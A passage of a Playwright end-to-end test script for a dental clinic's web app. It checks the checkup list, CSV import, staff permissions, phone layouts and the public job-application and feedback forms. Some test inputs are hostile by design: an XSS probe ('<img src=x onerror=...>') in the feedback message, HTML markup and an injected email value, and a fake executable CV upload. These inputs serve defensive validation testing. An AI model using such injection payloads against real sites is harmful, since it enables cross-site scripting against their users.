  await pk.getByRole('button', { name: '+ Add checkup' }).click();
  await pk.locator('.modal').getByLabel(/^Name/).fill('Remove Me Person');
  await pk.locator('.modal').getByLabel(/^Phone number/).fill('0300 5550103');
  await pk.locator('.modal').getByRole('button', { name: 'Add checkup patient' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.getByLabel('Name or phone').fill('Remove Me Person');
  const mine = pk.locator('table.checkup-table tbody tr[data-id]', { hasText: 'Remove Me Person' });
  await mine.waitFor();
  await mine.getByRole('button', { name: /^Edit / }).click();
  await pk.locator('.modal').getByRole('button', { name: 'Remove' }).click();
  await pk.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
  await mine.waitFor({ state: 'detached' });
});


// Rows of the Aaj ki List history that have no Mr# never get a patient file; those whose Treatment says checkup are checkup patients and are
// not sent as visits at all (they belong on the checkup list).
const pi = await newPage();
await pi.route('**/js/data/index.js', (r) => r.fulfill({
  contentType: 'text/javascript',
  body: `import { DEMO_MODE } from '../config.js';
let p;
export function getData() {
  return (p ||= import('./demo.js').then(async (m) => {
    const d = await m.createDemoAdapter();
    const real = d.importAajSheet;
    d.importAajSheet = (rows, create) => { (window.__aajCalls ||= []).push({ create, mr: rows.map((x) => !!x[2]) }); return real(rows, create); };
    return d;
  }));
}
`,
}));
await step('Import "4. Aaj ki List history": rows without an Mr# never get a new patient file (a checkup row is not even sent), rows with an Mr# keep the "Add patient records" choice', async () => {
  await loginAs(pi, 'Dr. Ali Rashid');
  await pi.goto(BASE + '#/staff/admin?tab=import');
  await pi.waitForSelector('h2:text("4. Aaj ki List history")');
  const csv = [
    "Tt Mr #,Tt Patient Name,Monthly,Tt Treatment,Token No,Waiting,Group,Doctor's Name,Tt Treatment Details,P.P,Healthwire,Tt Contact No,Reminder Status",
    '9811,Areeba Siddiqui,4,Monthly,3,Completed,,"Dr. Hina (sample)",U L 016 Pc refresh,,Done,,',
    ',Brand New Nobody,,Checkup,6,Completed,,Dr Nida,,,,0300 5559999,',
    ',Forgot Mr Person,,Filling,7,Completed,,Dr Nida,,,,0300 5558888,', ''].join('\n');
  const aaj = pi.locator('section.panel:has(h2:text("4. Aaj ki List history")) input[type=file]');
  await aaj.setInputFiles({ name: 'aaj-ki-list-sample.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await pi.waitForSelector('section[data-tab]');
  await pi.locator('section[data-tab] select[aria-label^="Branch for"]').selectOption('2');
  await pi.locator('section[data-tab] input[type=date]').fill('2026-08-20');
  await pi.locator('section[data-tab] input[type=date]').dispatchEvent('change');
  const box = pi.locator('label:has-text("Rows without an Mr# never get a patient file") input[type=checkbox]');
  assert.ok(await box.isChecked(), 'the box stays ticked by default');
  await pi.locator('.alert:has-text("1 row has no Mr# and a Treatment that says checkup")').waitFor();
  await pi.getByRole('button', { name: 'Import 2 visits' }).click();
  await pi.waitForSelector('.alert:has-text("Visits:")');
  assert.deepEqual(await pi.evaluate(() => window.__aajCalls), [{ create: true, mr: [true] }, { create: false, mr: [false] }], 'the checkup row is not sent; the row whose Mr# was forgotten is sent without "Add patient records"');
  await pi.locator('.alert:has-text("Checkup patients not imported as visits: 1")').waitFor();
  await pi.locator('.topsearch input').fill('Brand New Nobody');
  await pi.locator('.search-results:has-text("No patient matches")').waitFor();
});

// ------------------------------------------------------------- the database update has not been run yet (the site keeps working)
const pm = await newPage();
// The demo is cut off from the checkup functions, as the live site is before the two migrations are applied.
await pm.route('**/js/data/index.js', (r) => r.fulfill({
  contentType: 'text/javascript',
  body: `import { DEMO_MODE } from '../config.js';
let p;
export function getData() {
  return (p ||= import('./demo.js').then(async (m) => {
    const d = await m.createDemoAdapter();
    const gone = () => { throw Object.assign(new Error('CHECKUPS_MISSING: the checkup list is not switched on yet. It appears once the database update has been run.'), { code: 'CHECKUPS_MISSING' }); };
    d.listDayCheckups = async () => Object.assign([], { missing: true });
    for (const k of ['listCheckups', 'exportCheckups', 'addCheckup', 'updateCheckup', 'deleteCheckup', 'registerCheckupAsPatient', 'linkCheckupToPatient', 'importCheckups']) d[k] = gone;
    d.subscribeCheckups = () => () => {};
    return d;
  }));
}
`,
}));
await step('before the database update: the Aaj ki List works without checkup rows or "+ Checkup patient", and the Checkups page says it is not switched on yet', async () => {
  await loginAs(pm, 'Front desk \\(North Nazimabad\\)');
  await pm.goto(BASE + '#/staff/sheet');
  await pm.waitForSelector('table.sheet tbody tr');
  assert.equal(await pm.locator('table.sheet tbody tr.is-checkup').count(), 0);
  assert.equal(await pm.getByRole('button', { name: '+ Checkup patient' }).count(), 0);
  assert.ok(await pm.getByRole('button', { name: '+ New walk-in' }).count(), 'the walk-in button stays');
  assert.doesNotMatch(await pm.locator('.sheet-counts').innerText(), /Checkups/);
  await pm.goto(BASE + '#/staff/checkups');
  await pm.waitForSelector('.empty:has-text("not switched on yet")');
  assert.equal(await pm.getByRole('button', { name: '+ Add checkup' }).count(), 0);
});


// The checkups cannot be loaded for another reason: the visits still show, with a small warning.
const pe = await newPage();
await pe.route('**/js/data/index.js', (r) => r.fulfill({
  contentType: 'text/javascript',
  body: `import { DEMO_MODE } from '../config.js';
let p;
export function getData() {
  return (p ||= import('./demo.js').then(async (m) => {
    const d = await m.createDemoAdapter();
    d.listDayCheckups = async () => { throw new Error('The checkup list did not answer.'); };
    return d;
  }));
}
`,
}));
await step('when only the checkups fail to load, the Aaj ki List still shows the patients, with a warning above the table', async () => {
  await loginAs(pe, 'Front desk \\(North Nazimabad\\)');
  await pe.goto(BASE + '#/staff/sheet');
  await pe.waitForSelector('table.sheet tbody tr');
  await pe.locator('.alert-warning:has-text("Checkup patients could not be loaded: The checkup list did not answer.")').waitFor();
  assert.ok((await pe.locator('table.sheet tbody tr:not(.is-checkup)').count()) >= 5, 'the patients are there');
  assert.ok(await pe.getByRole('button', { name: '+ New walk-in' }).count());
});

// A person who may view the list but not edit it (the accountant): everything is read-only.
const pa = await newPage();
await step('Checkups page for a person who may only view: no add, edit or register buttons, and the cells are read-only', async () => {
  await loginAs(pa, 'Accountant');
  await pa.goto(BASE + '#/staff/checkups');
  await pa.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await pa.getByRole('button', { name: '+ Add checkup' }).count(), 0);
  assert.equal(await pa.locator('table.checkup-table').getByRole('button', { name: /^(Register|Edit) / }).count(), 0);
  assert.ok(await pa.locator('table.checkup-table tbody tr[data-id]').first().locator('select[aria-label^="Follow-up status for"]').isDisabled());
  assert.ok(await pa.locator('table.checkup-table tbody tr[data-id]').first().locator('input[aria-label^="Notes for"]').isDisabled());
});

// ------------------------------------------------------------- phone width
const pp = await newPage({ width: 375, height: 812 });
const noSideScroll = async (pg) => assert.ok(await pg.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1), 'the page itself does not scroll sideways');
await step('phone: the Checkups page and the Aaj ki List with checkup rows fit the screen', async () => {
  await loginAs(pp, 'Front desk \\(North Nazimabad\\)');
  await pp.goto(BASE + '#/staff/checkups');
  await pp.waitForSelector('table.checkup-table tbody tr[data-id]');
  await noSideScroll(pp);
  assert.ok(await pp.getByLabel('Name or phone').isVisible());
  assert.ok(await pp.getByRole('button', { name: 'Next' }).isVisible() || (await pp.locator('.pager-info').isVisible()));
  await shot(pp, '17-checkups-phone');
  await pp.goto(BASE + '#/staff/sheet');
  await pp.waitForSelector('table.sheet tbody tr.is-checkup');
  await noSideScroll(pp);
  await shot(pp, '18-sheet-checkups-phone');
});

await step('phone: the Patient column of the Checkups page stays at the left edge while the other columns scroll sideways', async () => {
  await pp.goto(BASE + '#/staff/checkups');
  await pp.waitForSelector('table.checkup-table tbody tr[data-id]');
  const pinned = await pp.evaluate(() => {
    const wrap = document.querySelector('.checkup-table-wrap');
    wrap.scrollLeft = wrap.scrollWidth;
    const w = wrap.getBoundingClientRect();
    const cell = document.querySelector('table.checkup-table tbody tr[data-id] th.checkup-who').getBoundingClientRect();
    const head = document.querySelector('table.checkup-table thead th.checkup-who').getBoundingClientRect();
    return { scrolled: wrap.scrollLeft, cellLeft: cell.left - w.left, headLeft: head.left - w.left, cellRight: cell.right - w.left, wide: w.width };
  });
  assert.ok(pinned.scrolled > 200, 'the table scrolled sideways: ' + JSON.stringify(pinned));
  assert.ok(Math.abs(pinned.cellLeft) <= 2 && Math.abs(pinned.headLeft) <= 2, 'the name cell and its heading stay at the left edge: ' + JSON.stringify(pinned));
  assert.ok(pinned.cellRight < pinned.wide, 'and leave room for the other columns: ' + JSON.stringify(pinned));
  await noSideScroll(pp);
  // Register and Edit sit side by side, so a row is not taller than it needs to be
  const sides = await pp.evaluate(() => {
    const tr = document.querySelector('table.checkup-table tbody tr[data-id]');
    const buttons = [...tr.querySelectorAll('.row-actions button')].map((b) => b.getBoundingClientRect());
    return { n: buttons.length, sameLine: buttons.every((b) => Math.abs(b.top - buttons[0].top) < 2) };
  });
  assert.ok(sides.n >= 1 && sides.sameLine, 'the row buttons are on one line');
});

await step('phone: the Checkups page has a row on the first screen (More filters is closed), and the Aaj ki List add panel says it in one short sentence pair', async () => {
  await pp.goto(BASE + '#/staff/checkups');
  await pp.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await pp.locator('details.checkup-more').evaluate((el) => el.open), false);
  const top = await pp.locator('table.checkup-table tbody tr[data-id]').first().evaluate((el) => el.getBoundingClientRect().top);
  assert.ok(top < 700, 'the first row starts at ' + Math.round(top) + 'px of an 812px screen');
  await pp.goto(BASE + '#/staff/sheet');
  await pp.waitForSelector('.add-panel:not([hidden])');
  const hint = (await pp.locator('.add-panel-text .muted').innerText()).trim();
  assert.equal(hint, 'New and starting treatment? Use "+ New walk-in" (gets an Mr#). Only a checkup? Use "+ Checkup patient" (no Mr#).');
});
// ------------------------------------------------------------- Register needs both "Register new patients" and list editing
await step('Register needs both "Register new patients" and list editing: with list editing off for a person the button is not offered, and the data layer says no', async () => {
  // (the accountant's page: its own in-memory demo data, not used again after this)
  await tryAnotherRole(pa);
  await loginAs(pa, 'Dr. Ali Rashid');
  await pa.evaluate(async () => { const { state } = await import('/js/state.js'); await state.data.setOverride('s-fd-nn', 'sheet.edit', false); });
  await tryAnotherRole(pa);
  await loginAs(pa, 'Front desk.*North Nazimabad');
  const rights = await pa.evaluate(async () => { const { can } = await import('/js/state.js'); return [can('patients.create'), can('sheet.edit'), can('sheet.view')]; });
  assert.deepEqual(rights, [true, false, true], 'may register patients and see the list, but not edit it');
  await pa.goto(BASE + '#/staff/checkups');
  await pa.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await pa.locator('table.checkup-table').getByRole('button', { name: /^Register / }).count(), 0, 'no Register button on the Checkups page');
  await pa.goto(BASE + '#/staff/sheet');
  await pa.waitForSelector('table.sheet tbody tr.is-checkup');
  await pa.locator('table.sheet tbody tr.is-checkup').first().getByRole('button', { name: /Checkup options/ }).click();
  await pa.locator('.modal').waitFor();
  assert.equal(await pa.locator('.modal').getByRole('button', { name: 'Register as patient' }).count(), 0, 'and none in the options of a checkup row');
  await pa.keyboard.press('Escape');
  const answer = await pa.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const rows = await state.data.listDayCheckups({ branchId: 2, date: localISO() });
    try { await state.data.registerCheckupAsPatient(rows[0].id); return 'registered'; } catch (e) { return e.message; }
  });
  assert.match(answer, /NOT_ALLOWED: registering a patient needs "Register new patients" and "Add and edit Aaj ki List entries"/);
});

// ------------------------------------------------------------- the homepage forms: "Join our team" and "Complaints & suggestions"
// (owner, 11 Oct 2026). A visitor on a phone sends both forms; then Dr. Ali finds the application on the Job applications page and the
// website forms in the Complaints inbox; the clinic coordinator (no jobs.view) sees no application at all.
const pf = await newPage({ width: 390, height: 844 });
const docWidth = (pg) => pg.evaluate(() => document.documentElement.scrollWidth);
// Where the parts of the top bar sit, as [left, top, right, bottom]: the name, the nav and each link. Plus the doors and the
// sample-account line under them (page y), for the hero without the old buttons.
const barLayout = (pg) => pg.evaluate(() => {
  const r = (el) => { const b = el.getBoundingClientRect(); return [Math.round(b.left), Math.round(b.top + scrollY), Math.round(b.right), Math.round(b.bottom + scrollY)]; };
  const bar = document.querySelector('.site-header');
  return {
    name: r(bar.querySelector('.wordmark')), nav: r(bar.querySelector('nav')), links: [...bar.querySelectorAll('nav a')].map((a) => ({ text: a.textContent, box: r(a) })),
    doors: r(document.querySelector('.door-row')), demo: r(document.querySelector('.hero-demo')),
  };
});
await step('homepage: the top bar links to "Join our team" and "Complaints & suggestions" (on a phone on one line under the name, inside the screen); no buttons under the doors; a section further down says more; the footer links to both', async () => {
  await pf.goto(BASE);
  await pf.locator('.site-header nav a').first().waitFor();
  assert.deepEqual(await barLinks(pf), BAR);
  assert.equal(await pf.locator('.hero-forms').count(), 0, 'no buttons under the doors');
  // The two links do not fit beside the name on a phone: they take their own line under it, side by side, the hit areas
  // inside the screen and 44 px tall, and the page does not scroll sideways.
  for (const [w, ht] of [[390, 844], [360, 740]]) {
    await pf.setViewportSize({ width: w, height: ht });
    const bar = await barLayout(pf);
    assert.ok(bar.nav[1] >= bar.name[3], `at ${w} px the links are under the name, not over it: ${JSON.stringify(bar)}`);
    assert.equal(bar.links[0].box[1], bar.links[1].box[1], `at ${w} px both links are on one line`);
    for (const l of bar.links) assert.ok(l.box[0] >= 0 && l.box[2] <= w && l.box[3] - l.box[1] >= 44, `at ${w} px "${l.text}" is inside the screen and 44 px tall: ${JSON.stringify(l.box)}`);
    assert.ok(await docWidth(pf) <= w, `no sideways scrolling at ${w} px`);
    assert.ok(bar.demo[1] - bar.doors[3] <= 40, `at ${w} px the sample-account line follows the doors: ${JSON.stringify(bar)}`);
    await shot(pf, `39-home-header-${w}`);
  }
  // On a laptop (1366x768) they sit at the top right, beside the name, and the whole hero fits the first screen.
  await pf.setViewportSize({ width: 1366, height: 768 });
  const laptop = await barLayout(pf);
  assert.ok(laptop.nav[0] > laptop.name[2] && laptop.links.every((l) => l.box[1] < laptop.name[3] && l.box[3] > laptop.name[1]), `beside the name: ${JSON.stringify(laptop)}`);
  assert.ok(1366 - laptop.nav[2] <= 64, `at the right: ${JSON.stringify(laptop.nav)}`);
  assert.ok(laptop.demo[3] <= 768 && laptop.demo[1] - laptop.doors[3] <= 40, `the doors and the sample-account line are on the first screen: ${JSON.stringify(laptop)}`);
  await shot(pf, '39b-home-header-1366');
  await pf.setViewportSize({ width: 390, height: 844 });
  const section = pf.locator('#work-with-us');
  await section.scrollIntoViewIfNeeded();
  assert.equal(await section.locator('a.forms-card').count(), 2);
  assert.equal(await section.getByRole('link', { name: /Join our team/ }).getAttribute('href'), '#/join');
  assert.equal(await section.getByRole('link', { name: /Complaints & suggestions/ }).getAttribute('href'), '#/feedback');
  assert.match(await section.locator('.forms-band-note').innerText(), /only to Dr\. Ali Rashid and the clinic's management/);
  assert.equal(await pf.locator('.site-footer a[href="#/join"]').count(), 1, 'footer link to the job form');
  assert.equal(await pf.locator('.site-footer a[href="#/feedback"]').count(), 1, 'footer link to the feedback form');
  assert.ok(await docWidth(pf) <= 390, 'no sideways scrolling at 390 px');
  await shot(pf, '40-home-forms-390');
  await section.getByRole('link', { name: /Join our team/ }).click();
  await pf.waitForSelector('h1:has-text("Join our team")');
  assert.equal(await pf.title(), "Join our team | Dr. Ali Rashid's Dental Clinic");
  // The form's own top bar on a phone: the same two links on their own line, "Join our team" marked as the page on screen.
  assert.deepEqual(await barLinks(pf), [['Join our team', '#/join', 'page'], BAR[1]]);
  const bar = await pf.locator('.site-header nav a').evaluateAll((as) => as.map((a) => { const b = a.getBoundingClientRect(); return [b.left, b.right]; }));
  assert.ok(bar.every(([l, r]) => l >= 0 && r <= 390), `the links are inside the screen: ${JSON.stringify(bar)}`);
});
await step('join form on a phone: every field has a label; sent empty, each required field says what is missing, focus goes to the first, the error is linked to its field', async () => {
  const form = pf.locator('form.public-form');
  assert.ok(await docWidth(pf) <= 390, 'no sideways scrolling at 390 px');
  for (const label of ['Full name', 'Mobile number', 'Email', 'CNIC number', 'Job you are applying for', 'Degree or qualification', 'Graduation year', 'Experience', 'Preferred branch', 'CV file', 'Message']) {
    assert.equal(await form.getByLabel(new RegExp('^' + label)).count(), 1, 'label: ' + label);
  }
  const yearHint = (await form.getByLabel(/^Graduation year/).getAttribute('aria-describedby')).split(' ').find((id) => id.endsWith('-hint'));
  assert.equal(await pf.locator('#' + yearHint).innerText(), 'Optional. The year you finished, or expect to finish.');
  // The degree is a list; "Other" opens a box for the degree itself (the word "Other" is never sent).
  assert.deepEqual((await form.getByLabel(/^Degree or qualification/).locator('option').allTextContents()).slice(1), ['BDS', 'BDS + FCPS / MDS', 'Diploma', 'Intermediate', 'Other']);
  assert.equal(await form.getByLabel(/^Your degree or qualification/).isVisible(), false, 'no box for another degree until "Other" is chosen');
  assert.equal(await form.getByLabel(/^Mobile number/).getAttribute('inputmode'), 'tel', 'the phone keyboard for the number');
  assert.equal(await form.getByLabel(/^CNIC number/).getAttribute('inputmode'), 'numeric');
  await form.getByRole('button', { name: 'Send my application' }).click();
  assert.equal(await form.locator('.field-error').count(), 8, 'name, phone, CNIC, job, qualification, branch, CV and consent');
  const name = form.getByLabel(/^Full name/);
  assert.equal(await pf.evaluate(() => document.activeElement?.getAttribute('autocomplete')), 'name', 'focus is on the first field with an error');
  assert.equal(await name.getAttribute('aria-invalid'), 'true');
  const errorId = (await name.getAttribute('aria-describedby')).split(' ').find((id) => id.endsWith('-error'));
  assert.equal(await pf.locator('#' + errorId).innerText(), 'Please enter your full name.');
  assert.match(await form.innerText(), /Please tick this box, so the clinic may keep your details and contact you\./);
  await shot(pf, '41-join-errors-390');
});
await step('join form: a wrong phone, CNIC, email, CV type, "Other" without the degree and a CV over 5 MB are explained in plain words', async () => {
  const form = pf.locator('form.public-form');
  await form.getByLabel(/^Full name/).fill('Sample Applicant UI');
  await form.getByLabel(/^Mobile number/).fill('021 3456');
  await form.getByLabel(/^CNIC number/).fill('12345-123');
  await form.getByLabel(/^Email/).fill('sample.ui@example.com?subject=hello');
  await form.getByLabel(/^Degree or qualification/).selectOption('Other');
  const otherDegree = form.getByLabel(/^Your degree or qualification/);
  assert.equal(await otherDegree.isVisible(), true, '"Other" opens the box for the degree');
  await form.getByLabel(/^CV file/).setInputFiles({ name: 'cv.exe', mimeType: 'application/x-msdownload', buffer: Buffer.from('MZ') });
  assert.match(await form.innerText(), /Your CV must be a PDF, Word \(\.doc or \.docx\), JPG or PNG file\./, 'said as soon as the file is chosen');
  assert.equal(await form.locator('.form-cv-whatsapp').isVisible(), true, 'a CV the form cannot take: the WhatsApp way is offered');
  await form.getByRole('button', { name: 'Send my application' }).click();
  const text = await form.innerText();
  assert.match(text, /Please enter a Pakistani mobile number, for example 0300 1234567\./);
  assert.match(text, /A CNIC has 13 digits, for example 12345-1234567-1\./);
  assert.match(text, /Please check your email address, for example name@gmail\.com, or leave it empty\./, 'an address with ?subject= is no plain address');
  assert.match(text, /Your CV must be a PDF, Word/);
  assert.equal(await otherDegree.getAttribute('aria-invalid'), 'true', 'the error is on the box for the degree');
  const otherError = (await otherDegree.getAttribute('aria-describedby')).split(' ').find((id) => id.endsWith('-error'));
  assert.equal(await pf.locator('#' + otherError).innerText(), 'Please type your degree or qualification, for example BA or BSc.');
  await shot(pf, '41b-join-other-degree-390');
  await form.getByLabel(/^CV file/).setInputFiles({ name: 'cv.pdf', mimeType: 'application/pdf', buffer: Buffer.alloc(5 * 1024 * 1024 + 1) });
  assert.match(await form.innerText(), /Your CV is larger than 5 MB/);
  // A phone photo of a printed CV over 5 MB (the hint says a photo is fine): a phone cannot make it smaller or turn it into a
  // PDF, so the WhatsApp way is right under the error, as for the busy messages.
  await form.getByLabel(/^CV file/).setInputFiles({ name: 'IMG_0042.jpg', mimeType: 'image/jpeg', buffer: Buffer.alloc(6000000) });
  assert.match(await form.innerText(), /Your CV is larger than 5 MB\. Please choose a smaller file, or a PDF\./);
  const wa = form.locator('.form-cv-whatsapp');
  assert.equal(await wa.isVisible(), true, 'a 6 MB photo: the WhatsApp way is offered');
  assert.match(await wa.getByRole('link', { name: /^Send your CV on WhatsApp/ }).getAttribute('href'), /^https:\/\/wa\.me\/92\d+\?text=.*CV/);
  assert.deepEqual(await form.getByLabel(/^CV file/).evaluate((input) => {
    const next = input.nextElementSibling;
    return [next?.classList.contains('field-error'), next?.nextElementSibling?.classList.contains('form-cv-whatsapp')];
  }), [true, true], 'right under the error');
  await shot(pf, '41c-join-cv-too-large-390');
});
await step('join form: a complete application is sent; the thank-you takes focus and repeats nothing that was typed', async () => {
  const form = pf.locator('form.public-form');
  await form.getByLabel(/^Mobile number/).fill('+92 300 555 7788');
  await form.getByLabel(/^CNIC number/).fill('1234500077881');
  await form.getByLabel(/^CNIC number/).blur();
  assert.equal(await form.getByLabel(/^CNIC number/).inputValue(), '12345-0007788-1', 'the CNIC is shown in its usual shape');
  await form.getByLabel(/^Email/).fill('sample.ui+jobs@example.com');
  await form.getByLabel(/^Job you are applying for/).selectOption({ label: 'Dental hygienist' });
  await form.getByLabel(/^Your degree or qualification/).fill('BSc Dental Hygiene');
  await form.getByLabel(/^Graduation year/).fill('2021');
  await form.getByLabel(/^Preferred branch/).selectOption({ label: 'Gulberg Lahore' });
  await form.getByLabel(/^CV file/).setInputFiles({ name: 'sample-cv.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4 made-up CV for the test') });
  assert.equal(await form.locator('.form-cv-whatsapp').isVisible(), false, 'a CV the form takes: no WhatsApp way under it');
  await form.getByLabel(/^Message/).fill('<b>Hello</b> I can start next month.');
  await form.getByLabel(/may keep these details/).check();
  await form.getByRole('button', { name: 'Send my application' }).click();
  await pf.waitForSelector('.form-thanks h1');
  assert.equal(await pf.evaluate(() => document.activeElement?.tagName), 'H1', 'focus moves to the thank-you heading');
  const text = await pf.locator('main').innerText();
  for (const typed of ['Sample Applicant UI', '7788', '12345', 'Hello', 'hygienist']) assert.ok(!text.includes(typed), 'the thank-you does not repeat ' + typed);
  assert.equal(await pf.locator('main form').count(), 0, 'the form is gone');
  assert.ok(await docWidth(pf) <= 390, 'no sideways scrolling at 390 px');
  await shot(pf, '42-join-thanks-390');
});
await step('feedback form on a phone: type, topic, branch and message are required; "please contact me" needs a phone number', async () => {
  await pf.goto(BASE + '#/feedback');
  await pf.waitForSelector('h1:has-text("Complaints & suggestions")');
  assert.equal(await pf.title(), "Complaints and suggestions | Dr. Ali Rashid's Dental Clinic");
  const form = pf.locator('form.public-form');
  assert.ok(await docWidth(pf) <= 390, 'no sideways scrolling at 390 px');
  await form.getByRole('button', { name: 'Send', exact: true }).click();
  assert.equal(await form.locator('.field-error').count(), 4, 'type, topic, branch and message');
  assert.equal(await pf.evaluate(() => document.activeElement?.type), 'radio', 'focus is on the type choice');
  await form.getByRole('radio', { name: /Complaint/ }).check();
  assert.equal(await form.locator('.field-error').count(), 3, 'choosing a type clears its error');
  assert.deepEqual((await form.getByLabel(/^What is it about/).locator('option').allTextContents()).slice(1),
    ['Treatment', 'Doctor', 'Front desk & staff behaviour', 'Waiting time', 'Appointments & timings', 'Clinic cleanliness', 'Fees & billing',
      'Facilities (AC, seating, washroom, parking)', 'Website & online services', 'Other']);
  await form.getByLabel(/^What is it about/).selectOption({ label: 'Waiting time' });
  await form.getByLabel(/^Branch/).selectOption({ label: 'North Nazimabad' });
  await form.getByLabel(/^Message/).fill('Too short');
  await form.getByLabel(/Please contact me/).check();
  await form.getByRole('button', { name: 'Send', exact: true }).click();
  const text = await form.innerText();
  assert.match(text, /Please write a little more \(at least 10 characters\)\./);
  assert.match(text, /Please give your mobile number, so we can contact you about this\./);
  await shot(pf, '43-feedback-errors-390');
});
await step('feedback form: sent with contact details; the thank-you says the clinic will contact them and repeats nothing typed', async () => {
  const form = pf.locator('form.public-form');
  await form.getByLabel(/^Message/).fill('Waited two hours <img src=x onerror="window.__xss=1"> please add more chairs.');
  await form.getByLabel(/^Name/).fill('Sample Visitor UI');
  await form.getByLabel(/^Mobile number/).fill('0301 5557788');
  await form.getByLabel(/^Mr#/).fill('Mr# 9812');
  await form.getByRole('button', { name: 'Send', exact: true }).click();
  await pf.waitForSelector('.form-thanks h1:has-text("Thank you for telling us")');
  assert.equal(await pf.evaluate(() => document.activeElement?.tagName), 'H1');
  const text = await pf.locator('main').innerText();
  assert.match(text, /will call or message you on the number you gave/);
  for (const typed of ['Sample Visitor UI', '7788', 'chairs', '9812']) assert.ok(!text.includes(typed), 'the thank-you does not repeat ' + typed);
  assert.ok(await docWidth(pf) <= 390, 'no sideways scrolling at 390 px');
  await shot(pf, '44-feedback-thanks-390');
});
await step('feedback form: "Send another message" gives an empty form with focus on its heading, and an anonymous suggestion about no single branch goes through', async () => {
  await pf.getByRole('button', { name: 'Send another message' }).press('Enter');
  await pf.waitForSelector('main form.public-form');
  assert.deepEqual(await pf.evaluate(() => [document.activeElement?.tagName, document.activeElement?.textContent]), ['H1', 'Complaints & suggestions'],
    'focus moves to the heading of the new form (not lost to the page)');
  const form = pf.locator('form.public-form');
  assert.equal(await form.getByLabel(/^Message/).inputValue(), '');
  await form.getByRole('radio', { name: /Suggestion/ }).check();
  await form.getByLabel(/^What is it about/).selectOption({ label: 'Clinic cleanliness' });
  await form.getByLabel(/^Branch/).selectOption({ label: 'Not about one branch' });
  await form.getByLabel(/^Message/).fill('Please keep the waiting area cleaner (sample UI).');
  await form.getByRole('button', { name: 'Send', exact: true }).click();
  await pf.waitForSelector('.form-thanks h1');
  assert.match(await pf.locator('main').innerText(), /Messages are read every working day\./);
});
await step('the hidden honeypot box: out of the tab order and hidden from screen readers; a form with it filled is thanked and not stored', async () => {
  await pf.goto(BASE + '#/');
  await pf.waitForSelector('.door');
  await pf.goto(BASE + '#/feedback');
  await pf.waitForSelector('main form.public-form');
  // Its name and id are ones no browser or password manager fills in by itself (not "website", "url" or "homepage").
  const trap = pf.locator('.hp-field input[name="pf_trap"]');
  assert.equal(await trap.getAttribute('tabindex'), '-1');
  assert.equal(await trap.getAttribute('autocomplete'), 'off');
  assert.equal(await trap.getAttribute('aria-hidden'), 'true');
  assert.doesNotMatch(await trap.getAttribute('id'), /web|site|url|home/i);
  assert.equal(await pf.locator('.hp-field').getAttribute('aria-hidden'), 'true');
  assert.equal(await pf.locator('form.public-form input[name="website"], form.public-form input[name="url"]').count(), 0);
  const form = pf.locator('form.public-form');
  await form.getByRole('radio', { name: /Appreciation/ }).check();
  await form.getByLabel(/^What is it about/).selectOption({ label: 'Doctor' });
  await form.getByLabel(/^Branch/).selectOption({ label: 'DHA Karachi' });
  await form.getByLabel(/^Message/).fill('Honeypot sample message from a bot.');
  await trap.evaluate((el) => { el.value = 'http://spam.example'; });
  await form.getByRole('button', { name: 'Send', exact: true }).click();
  await pf.waitForSelector('.form-thanks h1');
});
await step('a full day of applications: the form says "try again tomorrow" in plain words, with a WhatsApp link to send the CV instead', async () => {
  await pf.goto(BASE + '#/join');
  await pf.waitForSelector('main form.public-form');
  // The database's answer once the day's 200 applications are in (FORM_BUSY_DAY), given by the data layer for this one step.
  await pf.evaluate(async () => {
    const { state } = await import('/js/state.js');
    window.__submitJob = state.data.submitJobApplication;
    state.data.submitJobApplication = async () => { throw new Error('FORM_BUSY_DAY: the clinic has received many job applications today. Please try again tomorrow.'); };
  });
  try {
    const form = pf.locator('form.public-form');
    await form.getByLabel(/^Full name/).fill('Sample Applicant Busy');
    await form.getByLabel(/^Mobile number/).fill('0300 5557799');
    await form.getByLabel(/^CNIC number/).fill('12345-0007799-1');
    await form.getByLabel(/^Job you are applying for/).selectOption({ label: 'Dental assistant' });
    await form.getByLabel(/^Degree or qualification/).selectOption('Diploma');
    await form.getByLabel(/^Preferred branch/).selectOption({ label: 'Any branch' });
    await form.getByLabel(/^CV file/).setInputFiles({ name: 'busy-cv.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4 made-up CV for the test') });
    await form.getByLabel(/may keep these details/).check();
    await form.getByRole('button', { name: 'Send my application' }).click();
    const alert = form.locator('.form-alert');
    await alert.waitFor();
    assert.match(await alert.innerText(), /^The clinic has received a lot of applications today\. Please try again tomorrow, or send your CV on WhatsApp\./);
    assert.match(await alert.getByRole('link', { name: /Send your CV on WhatsApp/ }).getAttribute('href'), /^https:\/\/wa\.me\/92\d{10}\?text=/, "the clinic's WhatsApp chat");
    assert.equal(await pf.evaluate(() => document.activeElement?.classList.contains('form-alert')), true, 'focus moves to the message');
    assert.equal(await form.locator('.field-error').count(), 0, 'no field is marked wrong');
    assert.equal(await form.getByRole('button', { name: 'Send my application' }).isEnabled(), true, 'the form stays, to send again tomorrow');
    await shot(pf, '44b-join-day-full-390');
  } finally {
    await pf.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.submitJobApplication = window.__submitJob; });
  }
});
await step('staff: Today shows Dr. Ali "New job applications" (2), which opens Job applications filtered to New', async () => {
  await pf.setViewportSize({ width: 1366, height: 860 });
  await loginAs(pf, 'Dr. Ali Rashid');
  const stat = pf.locator('a.stat', { hasText: 'New job applications' });
  await stat.waitFor();
  assert.equal(await stat.locator('strong').innerText(), '2', 'the made-up New application and the one just sent');
  assert.equal(await stat.getAttribute('href'), '#/staff/jobs?status=new');
  await stat.click();
  await pf.waitForSelector('table.jobs-table tbody tr');
  assert.equal(await pf.locator('.jobs-filters select').first().inputValue(), 'new', 'the status filter says New');
  await pf.waitForFunction(() => document.querySelectorAll('table.jobs-table tbody tr').length === 2);
  await pf.goto(BASE + '#/staff/today');
  await pf.waitForSelector('.stat-row');
});
await step('staff: Dr. Ali opens "Job applications" from the More menu: the new application is on top; status, job and branch filters work', async () => {
  await pf.setViewportSize({ width: 1366, height: 860 });
